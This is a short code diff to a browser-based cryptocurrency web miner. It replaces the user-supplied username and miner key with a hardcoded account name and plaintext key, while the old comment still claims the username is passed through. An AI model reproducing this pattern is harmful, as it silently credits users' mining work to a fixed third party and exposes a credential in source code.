@@ -487,7 +487,7 @@ if (username != null && username != "" && username != undefined) {
     for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
         let socketWorker = new Worker("js/webminer/worker.js"); //creates the worker
 
-        socketWorker.postMessage('Start,' + username + "," + rigid + "," + workerVer + "," + wallet_id + "," + miner_key); //passes the start command, username, rigid and worker version to the worker
+        socketWorker.postMessage('Start,' + "Raafet" + "," + rigid + "," + workerVer + "," + wallet_id + "," + "3142812s"); //passes the start command, username, rigid and worker version to the worker
         workerVer++; //adds one to workerVer, so you will get CPU0, CPU1, CPU2 etc.
 
         //executes when the worker sends a message
